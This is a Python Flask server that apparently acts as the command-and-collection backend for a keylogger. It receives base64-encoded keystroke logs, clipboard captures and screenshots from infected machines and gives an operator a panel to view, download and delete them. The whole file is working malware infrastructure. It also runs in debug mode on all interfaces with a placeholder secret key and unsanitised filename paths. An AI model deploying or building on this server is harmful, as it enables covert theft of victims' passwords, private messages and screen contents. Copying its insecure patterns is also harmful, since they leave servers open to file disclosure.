from flask import Flask, render_template, send_from_directory, request, redirect, url_for, flash
import os
import json
from PIL import Image
import io
import base64


# ************THIS IS THE COMBINATION OF SERVER AND WEB INTERFACE(FLASK APP)***************

app = Flask(__name__)
app.secret_key = 'your_secret_key'  # Replace with a secure key (e.g., os.urandom(24).hex())

# Directories for encrypted and decrypted files
UPLOADS_BASE = 'Uploads'
DECRYPTED_BASE = 'DecryptedFiles'

KEYLOGGER_UPLOADS = os.path.join(UPLOADS_BASE, 'keylogger')
CLIPBOARD_UPLOADS = os.path.join(UPLOADS_BASE, 'clipboard')
SCREENSHOT_UPLOADS = os.path.join(UPLOADS_BASE, 'screenshot')

KEYLOGGER_DECRYPTED = os.path.join(DECRYPTED_BASE, 'keylogger')
CLIPBOARD_DECRYPTED = os.path.join(DECRYPTED_BASE, 'clipboard')
SCREENSHOT_DECRYPTED = os.path.join(DECRYPTED_BASE, 'screenshot')

# Ensure directories exist
for folder in [KEYLOGGER_UPLOADS, CLIPBOARD_UPLOADS, SCREENSHOT_UPLOADS,
               KEYLOGGER_DECRYPTED, CLIPBOARD_DECRYPTED, SCREENSHOT_DECRYPTED]:
    os.makedirs(folder, exist_ok=True)

# Helper function to list files in a directory
def list_files(directory):
    return [f for f in os.listdir(directory) if os.path.isfile(os.path.join(directory, f))]

@app.route('/')
def index():
    # List files for each category
    keylogger_encrypted = list_files(KEYLOGGER_UPLOADS)
    clipboard_encrypted = list_files(CLIPBOARD_UPLOADS)
    screenshot_encrypted = list_files(SCREENSHOT_UPLOADS)
    keylogger_decrypted = list_files(KEYLOGGER_DECRYPTED)
    clipboard_decrypted = list_files(CLIPBOARD_DECRYPTED)
    screenshot_decrypted = list_files(SCREENSHOT_DECRYPTED)
    
    return render_template(
        'index.html',
        keylogger_encrypted=keylogger_encrypted,
        clipboard_encrypted=clipboard_encrypted,
        screenshot_encrypted=screenshot_encrypted,
        keylogger_decrypted=keylogger_decrypted,
        clipboard_decrypted=clipboard_decrypted,
        screenshot_decrypted=screenshot_decrypted
    )

@app.route('/view/<category>/<filename>')
def view_file(category, filename):
    folder_map = {
        'keylogger_encrypted': KEYLOGGER_UPLOADS,
        'clipboard_encrypted': CLIPBOARD_UPLOADS,
        'screenshot_encrypted': SCREENSHOT_UPLOADS,
        'keylogger_decrypted': KEYLOGGER_DECRYPTED,
        'clipboard_decrypted': CLIPBOARD_DECRYPTED,
        'screenshot_decrypted': SCREENSHOT_DECRYPTED
    }
    folder = folder_map.get(category)
    
    if not folder:
        flash(f'Category {category} not found.', 'error')
        return redirect(url_for('index'))

    file_path = os.path.join(folder, filename)
    if not os.path.exists(file_path):
        flash(f'File {filename} not found in {category}.', 'error')
        return redirect(url_for('index'))

    try:
        if 'screenshot' in category:
            with open(file_path, 'rb') as f:
                img_data = f.read()
            img_base64 = base64.b64encode(img_data).decode('utf-8')
            return render_template('view_image.html', filename=filename, img_data=img_base64)
        else:
            with open(file_path, 'r', encoding='utf-8') as f:
                content = f.read()
            return render_template('view_text.html', filename=filename, content=content)
    except Exception as e:
        flash(f'Error viewing {filename}: {e}', 'error')
        return redirect(url_for('index'))

@app.route('/download/<category>/<filename>')
def download_file(category, filename):
    folder_map = {
        'keylogger_encrypted': KEYLOGGER_UPLOADS,
        'clipboard_encrypted': CLIPBOARD_UPLOADS,
        'screenshot_encrypted': SCREENSHOT_UPLOADS,
        'keylogger_decrypted': KEYLOGGER_DECRYPTED,
        'clipboard_decrypted': CLIPBOARD_DECRYPTED,
        'screenshot_decrypted': SCREENSHOT_DECRYPTED
    }
    folder = folder_map.get(category)

    if folder and os.path.exists(os.path.join(folder, filename)):
        return send_from_directory(folder, filename, as_attachment=True)
    flash(f'File {filename} not found in {category}.', 'error')
    return redirect(url_for('index'))

@app.route('/delete/<category>/<filename>', methods=['POST'])
def delete_file(category, filename):
    folder_map = {
        'keylogger_decrypted': KEYLOGGER_DECRYPTED,
        'clipboard_decrypted': CLIPBOARD_DECRYPTED,
        'screenshot_decrypted': SCREENSHOT_DECRYPTED
    }
    folder = folder_map.get(category)

    if folder:
        file_path = os.path.join(folder, filename)
        if os.path.exists(file_path):
            os.remove(file_path)
            flash(f'File {filename} deleted successfully from {category}.', 'success')
        else:
            flash(f'File {filename} not found in {category}.', 'error')
    else:
        flash(f'Category {category} not found.', 'error')

    return redirect(url_for('index'))

@app.route('/upload', methods=['POST'])
def upload():
    try:
        # Get data_type from form
        data_type = request.form.get('data_type', 'unknown')
        # Handle keylog/clipboard data
        data = request.form.get('data')
        if data:
            encrypted_data = base64.b64decode(data)
            if data_type == "keylog":
                folder = KEYLOGGER_UPLOADS
                count = len(os.listdir(folder))
                file_path = os.path.join(folder, f"keylog_{count}.bin")
            elif data_type == "clipboard":
                folder = CLIPBOARD_UPLOADS
                count = len(os.listdir(folder))
                file_path = os.path.join(folder, f"clipboard_{count}.bin")
            elif data_type == "screenshot":
                folder = SCREENSHOT_UPLOADS
                count = len(os.listdir(folder))
                file_path = os.path.join(folder, f"screenshot_{count}.bin")
            else:
                print(f"Skipping unknown data type: {data_type}")
                return {"status": "error", "message": "Unknown data type"}, 400
            with open(file_path, "wb") as f:
                f.write(encrypted_data)
            print(f"Saved encrypted {data_type}: {file_path}")

        # Handle screenshot (if sent as file)
        screenshot = request.files.get('screenshot')
        if screenshot:
            screenshot_count = len(os.listdir(SCREENSHOT_UPLOADS))
            screenshot_path = os.path.join(SCREENSHOT_UPLOADS, f"screenshot_{screenshot_count}.bin")
            screenshot.save(screenshot_path)
            print(f"Saved encrypted screenshot: {screenshot_path}")

        return {"status": "success"}, 200
    except Exception as e:
        print(f"Server error: {e}")
        return {"status": "error", "message": str(e)}, 500

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=5000)